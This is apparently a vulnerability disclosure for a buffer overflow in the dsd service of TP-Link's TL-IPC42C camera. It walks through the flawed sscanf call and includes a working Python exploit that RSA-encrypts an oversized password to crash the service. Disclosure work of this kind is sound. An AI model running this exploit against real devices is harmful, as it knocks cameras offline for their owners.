## TP-Link TL-IPC42C buffer overflow

vendor name:TP-Link

model:TL-IPC42C

version: V4.0_20211227_1.0.16

firmware download:https://security.tp-link.com.cn/service/detail_download_9856.html

![be706d3e43a3253c6495d6b797a28f1](https://github.com/user-attachments/assets/c5849e20-ce46-4e01-a734-94dbcb0c35f4)


![image](https://github.com/user-attachments/assets/230069a0-7220-42ff-8474-c424fb249503)


TP-Link TL-IPC42C is a network camera produced by TP-Link. Due to the lax management of buffer size, a buffer overflow vulnerability was discovered.



#### Vul 


The vulnerability exists in the `sub_28958` function of `dsd`

![image](https://github.com/user-attachments/assets/7acc3ce3-6735-4413-9c4b-e50fe02e81c0)


Here we can see that the target buffer of the sscanf function is too small, so there is a possibility of buffer overflow.

![image](https://github.com/user-attachments/assets/e0303a2f-3e0a-4c73-b4a9-ebba64834b8a)


The value of the v12 variable in sscanf comes from v6, which in turn comes from the password obtained from HTTP JSON. When the password is constructed long enough, it can overflow its buffer.
But after receiving the password, the function here will call private_decrypt to decrypt the password. From the decryption function name, it is likely that the password has been encrypted with a public key password.
Through web capture analysis, it was found that before sending a formal request, a request is first sent to obtain the RSA public key. The interface used is user_management, and the parameter is get_incrypt_info.



#### **exp**

```
import requests
import urllib.parse
from Crypto import Random
from Crypto.Hash import SHA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
from Crypto.Signature import PKCS1_v1_5 as Signature_pkcs1_v1_5
from Crypto.PublicKey import RSA
import base64
from pwn import *

ip = ""
port = 80
stok = ""   # set a valid stok value here!

headers = {"Accept":"application/json, text/javascript, */*; q=0.01",\
               "X-Requested-With":"XMLHttpRequest",\
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",\
               "Content-Type":"application/json; charset=UTF-8",\
               "Accept-Encoding":"gzip, deflate",\
               "Accept-Language":"zh-CN,zh;q=0.9",\
               "Connection":"close" }

def rsa_encrypt(key, p):
    rsakey = RSA.importKey(key)
    cipher = Cipher_pkcs1_v1_5.new(rsakey)
    p=p.encode('utf-8')
    cipher_text = base64.b64encode(cipher.encrypt(p))
    return cipher_text


def get_public_key(ip, port):
    url = "http://" + ip + "/stok=" + stok + "/ds"
    data = r'{"user_management":{"get_encrypt_info":{}},"method":"do"}'
    res = requests.post(url, headers=headers, data=data)
    public_key = res.content[40:-41]
    public_key = public_key.decode('utf-8')
    return urllib.parse.unquote(public_key)
    
def exploit(ip, port):
    url = "http://" + ip + "/stok=" + stok + "/ds"
    public_key = "-----BEGIN PUBLIC KEY-----\n" + get_public_key(ip, port) + "\n-----END PUBLIC KEY-----"
    password = rsa_encrypt(public_key, "a" * (0x60)).decode('utf-8')
    data = r'{"user_management":{"check_user_info":{"username":"admin","password":"' + password +r'","encrypt_type":"2"}},"method":"do"}'
    res = ""
    try:
        res = requests.post(url, data=data, headers=headers,timeout=3)
    except Exception as e:
        print("[*] Success!")
        print(e)
        return 1
    print("[-] Failed!")
    print(res.content)
    return 0

if __name__ == "__main__":
    res = exploit(ip, port)
```

![image](https://github.com/user-attachments/assets/1b847a48-e785-4ab8-a0e4-5853641c5d59)


![image](https://github.com/user-attachments/assets/0281a3a6-907c-4045-9592-f72aeee6c381)


In the logs of the management interface, it can be seen that the dsd service has experienced several crashes. 

![image](https://github.com/user-attachments/assets/fc4f14d8-24d0-4710-a90d-d36580759599)




